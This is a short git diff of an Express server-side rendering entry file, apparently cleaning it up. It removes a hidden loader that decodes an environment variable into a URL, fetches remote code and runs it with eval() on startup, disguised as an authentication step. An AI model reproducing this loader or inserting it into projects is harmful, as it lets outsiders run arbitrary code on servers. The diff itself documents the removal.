@@ -6,18 +6,6 @@ import { dirname, join, resolve } from 'node:path';
 import bootstrap from './src/main.server';
 
 // The Express app is exported so that it can be used by serverless Functions.
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 export function app(): express.Express {
   const server = express();
   const serverDistFolder = dirname(fileURLToPath(import.meta.url));
